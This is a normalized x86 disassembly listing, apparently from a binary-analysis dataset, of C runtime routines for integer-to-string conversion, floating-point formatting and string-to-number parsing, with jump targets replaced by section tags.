mov eax [ ebp + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp edi 0x24
jg r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jge r-xdata
cmp [ ebp + 0x8 ] 0x0
jae r-xdata
lea ebx [ ebp - 0x44 ]
cmp [ ebp + 0x18 ] 0x0
je r-xdata
jmp r-xdata
mov eax edi
cdq
push edx
push eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
call sub_452452
mov [ ebx ] al
mov eax edi
cdq
push edx
push eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
inc ebx
call sub_45238f
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
cmp edx 0x0
jne r-xdata
cmp eax 0x0
jne r-xdata
mov [ esi ] 0x2d
inc esi
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
neg eax
adc edx 0x0
mov [ ebp + 0x8 ] eax
neg edx
mov [ ebp + 0xc ] edx
jmp r-xdata
lea edx [ ebp - 0x44 ]
cmp ebx edx
jne r-xdata
dec ebx
mov al [ ebx ]
cmp al 0xa
jge r-xdata
add al [ ebp + 0x1c ]
add al 0xf6
mov [ esi ] al
inc esi
add eax 0x30
mov [ esi ] al
inc esi
jmp r-xdata
sub_452834
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov cx 0x43fe
mov bx 0x3bcd
mov cx 0x407e
mov bx 0x3f6a
jmp r-xdata
cmp cx dx
jae r-xdata
fld [ ebp + 0xc ]
fstp [ ebp - 0x1c ]
fwait
fld [ ebp - 0x1c ]
jmp r-xdata
lea eax [ ebp + 0xc ]
mov dx [ eax + 0x8 ]
mov edi edx
and di 0x8000
mov [ ebp - 0x6 ] di
and dx 0x7fff
cmp dx 0x7fff
jne r-xdata
cmp cx dx
jne r-xdata
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov cx [ eax ]
or cx dx
or cx [ eax + 0x2 ]
or cx [ eax + 0x4 ]
or cx [ eax + 0x6 ]
jne r-xdata
push 0x0
push 0x0
call sub_452688
add esp 0x8
mov [ ebp - 0x4 ] eax
push 0xc00
push 0xc00
call sub_452688
add esp 0x8
test esi esi
jne r-xdata
call sub_45448c
mov [ eax ] 0x22
cmp [ ebp - 0x6 ] 0x0
je r-xdata
cmp bx dx
jbe r-xdata
fld [ ebp + 0xc ]
fstp [ ebp - 0x1c ]
fwait
fld [ ebp - 0x1c ]
jmp r-xdata
fld [ ebp + 0xc ]
fstp [ ebp - 0x10 ]
fwait
fld [ ebp + 0xc ]
fstp [ ebp - 0x14 ]
fwait
fld [ ebp - 0x14 ]
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
fld [ ebp - 0x10 ]
jmp r-xdata
fld [ ebp - 0x10 ]
fchs
jmp r-xdata
fld [ ebp + 0xc ]
fstp [ ebp - 0x1c ]
fwait
fld [ ebp - 0x1c ]
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
push 0xc00
mov edx [ ebp - 0x4 ]
push edx
call sub_452688
fld [ ebp - 0x10 ]
add esp 0x8
jmp r-xdata
sub_45294c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
cmp edi 0x2
jl r-xdata
mov [ ebx ] 0x0
mov eax [ ebp + 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp edi 0x24
jg r-xdata
test esi esi
jge r-xdata
lea ecx [ ebp - 0x24 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax esi
xor edx edx
div edi
mov [ ecx ] dl
inc ecx
mov eax esi
xor edx edx
div edi
mov esi eax
test eax eax
jne r-xdata
jmp r-xdata
mov [ ebx ] 0x2d
inc ebx
neg esi
lea edx [ ebp - 0x24 ]
cmp ecx edx
jne r-xdata
dec ecx
mov al [ ecx ]
cmp al 0xa
jge r-xdata
add al [ ebp + 0x18 ]
add al 0xf6
mov [ ebx ] al
inc ebx
add eax 0x30
mov [ ebx ] al
inc ebx
jmp r-xdata
sub_4529c0
push ebp
mov ebp esp
push 0x61
push 0x0
push 0xa
mov eax [ ebp + 0xc ]
push eax
mov edx [ ebp + 0x8 ]
push edx
call sub_45294c
add esp 0x14
pop ebp
retn
sub_4529dc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x4
jne r-xdata
cmp [ eax ] 0x5
jne r-xdata
xor edx edx
mov [ eax + 0x18 ] edx
mov [ eax + 0x1c ] edx
mov eax 0x1
pop ebp
retn
xor eax eax
pop ebp
retn
mov eax 0x1
pop ebp
retn
sub_452a08
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x4
jne r-xdata
cmp [ eax ] 0x5
jne r-xdata
xor edx edx
mov [ eax + 0x1c ] edx
mov [ eax + 0x20 ] edx
mov [ eax + 0x24 ] dx
mov eax 0x1
pop ebp
retn
xor eax eax
pop ebp
retn
mov eax 0x1
pop ebp
retn
sub_452a50
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov ecx 0xa
mov eax [ esi + 0x4 ]
xor edx edx
or eax eax
je r-xdata
mov eax [ esi ]
div ecx
mov [ esi ] eax
mov eax edx
pop esi
pop ebp
retn
div ecx
mov [ esi + 0x4 ] eax
sub_452a78
push ebp
mov ebp esp
push esi
push edi
mov esi [ ebp + 0x8 ]
mov ecx 0xa
mov eax [ esi ]
mul ecx
add eax [ ebp + 0xc ]
adc edx 0x0
mov [ esi ] eax
mov edi edx
mov eax [ esi + 0x4 ]
mul ecx
add eax edi
adc edx 0x0
mov [ esi + 0x4 ] eax
mov eax edx
pop edi
pop esi
pop ebp
retn
sub_452aa8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
push 0xe
call sub_451b34
pop ecx
cmp bl 0x47
je r-xdata
cmp [ edi - 0x1 ] 0x30
je r-xdata
cmp bl 0x67
jne r-xdata
dec edi
cmp esi edi
jb r-xdata
mov dl [ eax ]
cmp dl [ edi - 0x1 ]
jne r-xdata
jmp r-xdata
mov eax esi
jmp r-xdata
mov eax edi
dec edi
pop edi
pop esi
pop ebx
pop ebp
retn
sub_452aec
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
push 0xe
call sub_451b34
pop ecx
mov al [ eax ]
mov [ ebp - 0xa ] al
cmp [ ebp + 0xc ] 0x28
jle r-xdata
mov edx [ ebp + 0xc ]
mov [ ebp - 0x8 ] edx
mov cl [ ebp + 0x14 ]
and cl 0xdf
mov [ ebp - 0x9 ] cl
cmp cl 0x46
jne r-xdata
mov [ ebp + 0xc ] 0x28
mov edi [ ebp - 0x8 ]
test edi edi
jg r-xdata
mov edi [ ebp - 0x8 ]
neg edi
test edi edi
jle r-xdata
cmp [ ebp - 0x9 ] 0x45
jne r-xdata
mov edi 0x1
jmp r-xdata
mov eax [ ebp + 0x1c ]
push eax
lea edx [ ebp - 0x38 ]
push edx
lea ecx [ ebp - 0x4 ]
push ecx
push edi
mov eax [ ebp + 0x8 ]
push eax
call sub_453ac4
add esp 0x14
mov esi eax
mov ebx [ ebp + 0x10 ]
cmp esi 0x7fff
jne r-xdata
xor eax eax
mov edi eax
mov [ ebp + 0xc ] eax
jmp r-xdata
inc edi
inc [ ebp + 0xc ]
cmp esi 0x7ffe
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax rw-data
mov eax rw-data
jmp r-xdata
cmp [ ebp - 0x9 ] 0x46
je r-xdata
mov [ ebx ] 0x2d
inc ebx
mov eax rw-data
mov eax rw-data
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi eax
xor eax eax
or ecx 0xffffffff
mov esi ebx
[ edi ]
not ecx
sub edi ecx
mov edx ecx
xchg edi esi
shr ecx 0x2
mov eax edi
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
cmp esi 0x28
jg r-xdata
cmp [ ebp - 0x9 ] 0x47
jne r-xdata
mov edi eax
xor eax eax
or ecx 0xffffffff
mov esi ebx
[ edi ]
not ecx
sub edi ecx
mov edx ecx
xchg edi esi
shr ecx 0x2
mov eax edi
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
lea eax [ ebp - 0x38 ]
mov dl [ eax ]
inc eax
mov [ ebx ] dl
inc ebx
mov dl [ eax ]
inc eax
test dl dl
je r-xdata
test esi esi
jg r-xdata
cmp esi 0xfffffffd
jl r-xdata
cmp [ ebp + 0x18 ] 0x0
je r-xdata
mov cl [ ebp - 0xa ]
mov [ ebx ] cl
inc ebx
test dl dl
je r-xdata
xor edi edi
lea eax [ ebp - 0x38 ]
jmp r-xdata
mov [ ebx ] 0x30
inc ebx
mov dl [ ebp - 0xa ]
mov [ ebx ] dl
inc ebx
test esi esi
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov dl [ ebp + 0x14 ]
and dl 0x20
or dl 0x45
mov [ ebx ] dl
inc ebx
dec esi
jns r-xdata
mov al [ ebp - 0xa ]
mov [ ebx ] al
inc ebx
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
mov [ ebx ] dl
inc ebx
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
mov dl [ eax ]
test dl dl
jne r-xdata
mov [ ebx ] 0x30
inc ebx
inc esi
test esi esi
jne r-xdata
mov eax [ ebp + 0xc ]
mov eax 0x1
jmp r-xdata
mov [ ebx ] 0x2b
inc ebx
neg esi
mov [ ebx ] 0x2d
inc ebx
jmp r-xdata
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov cl [ ebp + 0x14 ]
push ecx
call sub_452aa8
add esp 0xc
mov ebx eax
jmp r-xdata
mov [ ebx ] dl
inc ebx
dec esi
jne r-xdata
add edi [ ebp - 0x8 ]
cmp edi [ ebp + 0xc ]
jge r-xdata
cmp esi eax
jg r-xdata
cmp esi 0x64
jl r-xdata
mov edi 0x4
jmp r-xdata
cmp esi 0x3e8
jl r-xdata
inc eax
mov dl [ ebp - 0xa ]
mov [ ebx ] dl
inc ebx
inc edi
dec esi
je r-xdata
mov ecx [ ebp + 0xc ]
sub ecx edi
mov edi ecx
add esi edi
push edi
push 0x30
push ebx
call sub_44f094
add esp 0xc
add ebx edi
dec esi
je r-xdata
mov edi 0x2
mov edi 0x3
jmp r-xdata
mov [ ebx + edi ] 0x0
lea eax [ ebx + edi ]
mov ebx eax
test edi edi
je r-xdata
cmp ebx [ ebp + 0x10 ]
jne r-xdata
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
jmp r-xdata
mov eax esi
mov ecx 0xa
cdq
idiv ecx
dec ebx
add dl 0x30
mov eax esi
mov ecx 0xa
mov [ ebx ] dl
dec edi
cdq
idiv ecx
mov esi eax
test edi edi
jne r-xdata
mov [ ebx ] 0x0
jmp r-xdata
mov [ ebx ] 0x30
inc ebx
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov dl [ ebp + 0x14 ]
push edx
call sub_452aa8
add esp 0xc
mov ebx eax
sub_452da4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
push 0xe
call sub_451b34
pop ecx
cmp di 0x47
je r-xdata
cmp [ ebx - 0x2 ] 0x30
je r-xdata
cmp di 0x67
jne r-xdata
sub ebx 0x2
cmp esi ebx
jb r-xdata
mov dx [ eax ]
cmp dx [ ebx - 0x2 ]
jne r-xdata
jmp r-xdata
mov eax esi
jmp r-xdata
mov eax ebx
sub ebx 0x2
pop edi
pop esi
pop ebx
pop ebp
retn
sub_452df0
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
push 0xe
call sub_451b34
mov ax [ eax ]
pop ecx
mov [ ebp - 0xc ] ax
cmp [ ebp + 0xc ] 0x28
jle r-xdata
mov edx [ ebp + 0xc ]
mov [ ebp - 0x8 ] edx
mov cx [ ebp + 0x14 ]
and cx 0xdf
mov [ ebp - 0xa ] cx
cmp cx 0x46
jne r-xdata
mov [ ebp + 0xc ] 0x28
mov edi [ ebp - 0x8 ]
test edi edi
jg r-xdata
mov edi [ ebp - 0x8 ]
neg edi
test edi edi
jle r-xdata
cmp [ ebp - 0xa ] 0x45
jne r-xdata
mov edi 0x1
jmp r-xdata
mov eax [ ebp + 0x1c ]
push eax
lea edx [ ebp - 0x64 ]
push edx
lea ecx [ ebp - 0x4 ]
push ecx
push edi
mov eax [ ebp + 0x8 ]
push eax
call sub_453d98
add esp 0x14
mov esi eax
mov ebx [ ebp + 0x10 ]
cmp esi 0x7fff
jne r-xdata
xor eax eax
mov edi eax
mov [ ebp + 0xc ] eax
jmp r-xdata
inc edi
inc [ ebp + 0xc ]
cmp esi 0x7ffe
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax rw-data
mov eax rw-data
jmp r-xdata
cmp [ ebp - 0xa ] 0x46
je r-xdata
mov [ ebx ] 0x2d
add ebx 0x2
mov edx rw-data
mov edx rw-data
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
push ebx
call sub_44f370
add esp 0x8
jmp r-xdata
cmp esi 0x28
jg r-xdata
cmp [ ebp - 0xa ] 0x47
jne r-xdata
push edx
push ebx
call sub_44f370
add esp 0x8
jmp r-xdata
lea eax [ ebp - 0x64 ]
mov dx [ eax ]
add eax 0x2
mov [ ebx ] dx
add ebx 0x2
mov dx [ eax ]
add eax 0x2
test dx dx
je r-xdata
test esi esi
jg r-xdata
cmp esi 0xfffffffd
jl r-xdata
cmp [ ebp + 0x18 ] 0x0
je r-xdata
mov cx [ ebp - 0xc ]
mov [ ebx ] cx
add ebx 0x2
test dx dx
je r-xdata
xor edi edi
lea eax [ ebp - 0x64 ]
jmp r-xdata
mov [ ebx ] 0x30
add ebx 0x2
mov dx [ ebp - 0xc ]
mov [ ebx ] dx
add ebx 0x2
test esi esi
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov dx [ ebp + 0x14 ]
and dx 0x20
or dx 0x45
mov [ ebx ] dx
add ebx 0x2
dec esi
jns r-xdata
mov ax [ ebp - 0xc ]
mov [ ebx ] ax
add ebx 0x2
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
mov [ ebx ] dx
add ebx 0x2
mov dx [ eax ]
add eax 0x2
test dx dx
jne r-xdata
mov dx [ eax ]
test dx dx
jne r-xdata
mov [ ebx ] 0x30
add ebx 0x2
inc esi
test esi esi
jne r-xdata
mov eax [ ebp + 0xc ]
mov eax 0x1
jmp r-xdata
mov [ ebx ] 0x2b
add ebx 0x2
neg esi
mov [ ebx ] 0x2d
add ebx 0x2
jmp r-xdata
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov cx [ ebp + 0x14 ]
push ecx
call sub_452da4
add esp 0xc
mov ebx eax
jmp r-xdata
mov [ ebx ] dx
add ebx 0x2
dec esi
jne r-xdata
add edi [ ebp - 0x8 ]
cmp edi [ ebp + 0xc ]
jge r-xdata
cmp esi eax
jg r-xdata
cmp esi 0x64
jl r-xdata
mov edi 0x4
jmp r-xdata
cmp esi 0x3e8
jl r-xdata
add eax 0x2
mov dx [ ebp - 0xc ]
mov [ ebx ] dx
add ebx 0x2
inc edi
dec esi
je r-xdata
mov ecx [ ebp + 0xc ]
sub ecx edi
mov edi ecx
add esi edi
push edi
push 0x30
push ebx
call sub_44f094
add esp 0xc
add edi edi
add ebx edi
dec esi
je r-xdata
mov edi 0x2
mov edi 0x3
jmp r-xdata
mov [ ebx + edi * 2 ] 0x0
lea eax [ ebx + edi * 2 ]
mov ebx eax
test edi edi
je r-xdata
cmp ebx [ ebp + 0x10 ]
jne r-xdata
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
jmp r-xdata
mov eax esi
mov ecx 0xa
cdq
idiv ecx
add dx 0x30
add ebx 0xfffffffe
mov eax esi
mov ecx 0xa
mov [ ebx ] dx
dec edi
cdq
idiv ecx
mov esi eax
test edi edi
jne r-xdata
mov [ ebx ] 0x0
jmp r-xdata
mov [ ebx ] 0x30
add ebx 0x2
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov dx [ ebp + 0x14 ]
push edx
call sub_452da4
add esp 0xc
mov ebx eax
sub_4530d8
push ebp
mov ebp esp
add esp 0xffffffbc
xor eax eax
xor edx edx
lea ecx [ ebp - 0x24 ]
push ebx
push esi
push edi
lea edi [ ebp - 0x24 ]
mov [ ebp - 0x4 ] 0x8000
mov [ ebp - 0x8 ] 0x13
mov [ ebp - 0x9 ] 0x0
mov [ ebp - 0xa ] 0x1
mov [ ebp - 0xb ] 0x0
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0xd ] 0x0
mov [ ebp - 0x14 ] eax
mov esi 0xfffffffe
mov [ ebp - 0x18 ] 0x1
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] dx
mov [ ebp - 0x34 ] ecx
push 0xe
call sub_451b34
pop ecx
mov al [ eax ]
mov [ ebp - 0x3d ] al
test bl 0x80
jne r-xdata
mov [ ebp - 0x18 ] 0xffffffff
jmp r-xdata
dec [ ebp + 0x18 ]
js r-xdata
push ebx
call sub_454234
pop ecx
test eax eax
jne r-xdata
cmp [ ebp + 0x18 ] 0x0
jl r-xdata
mov ebx 0x65
cmp ebx 0x2b
jne r-xdata
inc [ ebp - 0x14 ]
mov edx [ ebp + 0x14 ]
push edx
call [ ebp + 0xc ]
pop ecx
mov ebx eax
inc eax
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] ax
jmp r-xdata
mov ecx [ ebp + 0x14 ]
push ecx
push ebx
call [ ebp + 0x10 ]
add esp 0x8
dec [ ebp - 0x14 ]
xor edx edx
mov [ ebp - 0x18 ] edx
cmp [ ebp - 0x4 ] 0x8000
jne r-xdata
cmp ebx 0x2d
jne r-xdata
mov [ ebp - 0xb ] 0x1
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor edi edi
cmp ebx 0x65
je r-xdata
mov [ ebp - 0x4 ] esi
cmp [ ebp - 0xa ] 0x1
jne r-xdata
mov dl 0x1
mov [ ebp - 0xb ] dl
mov [ ebp - 0x9 ] dl
dec [ ebp + 0x18 ]
js r-xdata
mov edx [ ebp + 0x1c ]
mov ecx [ ebp - 0x14 ]
add [ edx ] ecx
mov eax [ ebp + 0x20 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov ecx [ ebp + 0x8 ]
mov eax [ ebp - 0x24 ]
mov [ ecx ] eax
mov eax [ ebp - 0x20 ]
mov [ ecx + 0x4 ] eax
mov ax [ ebp - 0x1c ]
mov [ ecx + 0x8 ] ax
jmp r-xdata
fld [ ebp - 0x24 ]
fchs
fstp [ ebp - 0x24 ]
fwait
mov [ ebp - 0x44 ] 0x1
cmp ebx 0x45
jne r-xdata
mov [ ebp - 0xa ] 0x0
movsx eax [ ebp - 0x3d ]
cmp ebx eax
jne r-xdata
cmp [ ebp - 0xb ] 0x0
je r-xdata
inc [ ebp - 0x14 ]
mov eax [ ebp + 0x14 ]
push eax
call [ ebp + 0xc ]
pop ecx
mov ebx eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x14 ]
mov eax [ ebp + 0x14 ]
push eax
call [ ebp + 0xc ]
pop ecx
mov ebx eax
cmp [ ebp - 0x44 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
push ebx
call [ ebp + 0x10 ]
add esp 0x8
dec [ ebp - 0x14 ]
cmp ebx 0x30
jl r-xdata
cmp [ ebp - 0x4 ] 0x8000
jne r-xdata
cmp ebx 0x49
je r-xdata
test esi esi
jge r-xdata
neg edi
neg [ ebp - 0xd ]
cmp ebx 0x30
jl r-xdata
xor eax eax
cmp ebx 0x2d
mov [ ebp - 0x44 ] eax
jne r-xdata
cmp esi 0xfffffffe
je r-xdata
cmp ebx 0x39
jg r-xdata
test esi esi
jle r-xdata
inc [ ebp - 0x14 ]
mov edx [ ebp + 0x14 ]
push edx
call [ ebp + 0xc ]
pop ecx
mov ebx eax
dec [ ebp + 0x18 ]
js r-xdata
cmp ebx 0x4e
je r-xdata
cmp [ ebp - 0xd ] 0x0
je r-xdata
xor edx edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] dx
jmp r-xdata
cmp ebx 0x39
jg r-xdata
cmp ebx 0x2b
je r-xdata
mov [ ebp - 0xc ] 0x1
jmp r-xdata
sub ebx 0x30
inc esi
test esi esi
jg r-xdata
xor edx edx
mov edx esi
jmp r-xdata
cmp ebx 0x4e
jne r-xdata
inc [ ebp - 0x14 ]
mov ecx [ ebp + 0x14 ]
push ecx
call [ ebp + 0xc ]
pop ecx
mov ebx eax
dec [ ebp + 0x18 ]
js r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
add edx edx
lea edx [ edx + edx * 4 ]
add ebx edx
add ebx 0xffffffd0
mov edi ebx
cmp ebx 0x1344
jle r-xdata
dec [ ebp + 0x18 ]
js r-xdata
cmp esi 0x9
jg r-xdata
mov eax [ ebp - 0x34 ]
test ebx ebx
mov [ eax ] bx
je r-xdata
mov [ ebp - 0x4 ] edx
jmp r-xdata
inc [ ebp - 0x14 ]
mov eax [ ebp + 0x14 ]
push eax
call [ ebp + 0xc ]
pop ecx
mov ebx eax
dec [ ebp + 0x18 ]
js r-xdata
cmp ebx 0x41
jne r-xdata
mov edx esi
mov edx [ ebp - 0x8 ]
jmp r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] ax
mov ecx [ ebp - 0x34 ]
mov ax 0xffff
mov [ ecx + 0x6 ] ax
mov edx [ ebp - 0x34 ]
mov [ edx + 0x4 ] ax
mov edx [ ebp - 0x34 ]
mov [ edx + 0x2 ] ax
mov edx [ ebp - 0x34 ]
mov [ edx ] ax
mov ecx [ ebp - 0x34 ]
mov [ ecx + 0x8 ] 0x7ffe
jmp r-xdata
mov [ ebp - 0xd ] 0x1
jmp r-xdata
cmp esi [ ebp - 0x8 ]
jg r-xdata
mov eax [ edi ]
add eax eax
lea eax [ eax + eax * 4 ]
add eax ebx
mov [ edi ] eax
jmp r-xdata
or esi 0xffffffff
cmp [ ebp - 0x4 ] 0x8000
je r-xdata
mov esi 0x1
jmp r-xdata
cmp ebx 0x46
jne r-xdata
inc [ ebp - 0x14 ]
mov eax [ ebp + 0x14 ]
push eax
call [ ebp + 0xc ]
pop ecx
mov ebx eax
dec [ ebp + 0x18 ]
js r-xdata
test edi edi
jle r-xdata
mov eax [ ebp - 0x4 ]
lea ecx [ ebp - 0x24 ]
sub eax edx
push ecx
add edi eax
call sub_452718
pop ecx
fstp [ ebp - 0x24 ]
fwait
test edi edi
je r-xdata
mov [ ebp - 0x18 ] 0x2
jmp r-xdata
mov edx [ edi ]
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x3c ] edx
mov ecx [ edi + 0x4 ]
mov [ ebp - 0x38 ] ecx
push ebx
push eax
call sub_452a78
add esp 0x8
test eax eax
je r-xdata
dec [ ebp - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
cmp ebx 0x4e
jne r-xdata
mov eax edi
neg eax
mov eax edi
jmp r-xdata
mov ecx [ ebp - 0x3c ]
mov [ edi ] ecx
mov eax [ ebp - 0x38 ]
mov [ edi + 0x4 ] eax
jmp r-xdata
lea edx [ esi - 0x1 ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov edx [ rw-data ]
mov [ ebp - 0x24 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x20 ] edx
mov dx [ rw-data ]
mov [ ebp - 0x1c ] dx
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x24 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov ax [ rw-data ]
mov [ ebp - 0x1c ] ax
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
fld [ ebp - 0x24 ]
fld [ ebp - 0x30 ]
fmulp st1
fstp [ ebp - 0x24 ]
fwait
fld [ ebp - 0x24 ]
fld [ ebp - 0x30 ]
fdivp st1
fstp [ ebp - 0x24 ]
fwait
jmp r-xdata
push eax
call sub_4524f4
pop ecx
fstp [ ebp - 0x30 ]
fwait
test edi edi
jge r-xdata
mov edx [ rw-data ]
mov [ ebp - 0x24 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x20 ] edx
mov dx [ rw-data ]
mov [ ebp - 0x1c ] dx
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x24 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov ax [ rw-data ]
mov [ ebp - 0x1c ] ax
jmp r-xdata
sub_453538
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
test al 0x4
je r-xdata
test al 0x8
je r-xdata
push [ rw-data ]
push [ rw-data ]
mov dx [ ebx + 0x8 ]
push edx
push [ ebx + 0x4 ]
push [ ebx ]
push 0x1
call sub_452834
add esp 0x18
fstp [ esi ]
fwait
jmp r-xdata
fld [ rw-data ]
fstp [ ebp - 0x8 ]
fwait
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov dx [ ebx + 0x8 ]
push edx
push [ ebx + 0x4 ]
push [ ebx ]
push 0x0
call sub_452834
add esp 0x18
fstp [ esi ]
fwait
mov ecx [ ebx ]
mov [ esi ] ecx
mov ecx [ ebx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov cx [ ebx + 0x8 ]
mov [ esi + 0x8 ] cx
jmp r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4535d0
push ebp
mov ebp esp
add esp 0xffffffbc
xor eax eax
xor edx edx
lea ecx [ ebp - 0x24 ]
push ebx
push esi
push edi
lea edi [ ebp - 0x24 ]
mov [ ebp - 0x4 ] 0x8000
mov [ ebp - 0x8 ] 0x13
mov [ ebp - 0x9 ] 0x0
mov [ ebp - 0xa ] 0x1
mov [ ebp - 0xb ] 0x0
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0xd ] 0x0
mov [ ebp - 0x14 ] eax
mov esi 0xfffffffe
mov [ ebp - 0x18 ] 0x1
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] dx
mov [ ebp - 0x34 ] ecx
push 0xe
call sub_451b34
mov ax [ eax ]
pop ecx
mov [ ebp - 0x3e ] ax
push ebx
call sub_451d50
pop ecx
test eax eax
jne r-xdata
mov [ ebp - 0x18 ] 0xffffffff
jmp r-xdata
inc [ ebp - 0x14 ]
mov edx [ ebp + 0x14 ]
push edx
call [ ebp + 0xc ]
pop ecx
mov ebx eax
inc eax
jne r-xdata
dec [ ebp + 0x18 ]
js r-xdata
cmp [ ebp + 0x18 ] 0x0
jl r-xdata
mov ebx 0x65
cmp ebx 0x2b
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] ax
jmp r-xdata
mov ecx [ ebp + 0x14 ]
push ecx
push ebx
call [ ebp + 0x10 ]
add esp 0x8
dec [ ebp - 0x14 ]
xor edx edx
mov [ ebp - 0x18 ] edx
cmp [ ebp - 0x4 ] 0x8000
jne r-xdata
cmp ebx 0x2d
jne r-xdata
mov [ ebp - 0xb ] 0x1
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor edi edi
cmp ebx 0x65
je r-xdata
mov [ ebp - 0x4 ] esi
cmp [ ebp - 0xa ] 0x1
jne r-xdata
mov dl 0x1
mov [ ebp - 0xb ] dl
mov [ ebp - 0x9 ] dl
dec [ ebp + 0x18 ]
js r-xdata
mov edx [ ebp + 0x1c ]
mov ecx [ ebp - 0x14 ]
add [ edx ] ecx
mov eax [ ebp + 0x20 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov ecx [ ebp + 0x8 ]
mov eax [ ebp - 0x24 ]
mov [ ecx ] eax
mov eax [ ebp - 0x20 ]
mov [ ecx + 0x4 ] eax
mov ax [ ebp - 0x1c ]
mov [ ecx + 0x8 ] ax
jmp r-xdata
fld [ ebp - 0x24 ]
fchs
fstp [ ebp - 0x24 ]
fwait
mov [ ebp - 0x44 ] 0x1
cmp ebx 0x45
jne r-xdata
mov [ ebp - 0xa ] 0x0
movzx eax [ ebp - 0x3e ]
cmp ebx eax
jne r-xdata
cmp [ ebp - 0xb ] 0x0
je r-xdata
inc [ ebp - 0x14 ]
mov eax [ ebp + 0x14 ]
push eax
call [ ebp + 0xc ]
pop ecx
